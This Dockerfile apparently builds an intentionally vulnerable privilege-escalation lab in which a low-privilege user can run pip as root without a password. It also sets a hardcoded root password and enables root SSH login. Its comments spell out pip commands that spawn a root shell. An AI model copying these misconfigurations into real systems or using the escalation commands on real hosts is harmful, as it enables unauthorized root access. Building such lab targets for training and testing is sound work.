FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_pip
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/pip as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and pip
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        python3-pip \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify pip is installed and find its path
RUN which pip3 && ls -la $(which pip3)
# Create a symlink if /usr/bin/pip doesn't exist (Debian uses pip3)
RUN if [ ! -f /usr/bin/pip ]; then ln -s /usr/bin/pip3 /usr/bin/pip; fi
RUN ls -la /usr/bin/pip

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# pip can spawn an editor via: sudo pip install -e . --global-option="--help"
# or more directly: TF=$(mktemp -d) && echo "import os; os.execl('/bin/sh','sh','-c','sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py && sudo pip install $TF
# The known exploit: sudo pip config --editor '/bin/sh -s' edit
# This launches /bin/sh as the editor for pip's config, giving a root shell.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/pip" > /etc/sudoers.d/pip && \
    chmod 440 /etc/sudoers.d/pip

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]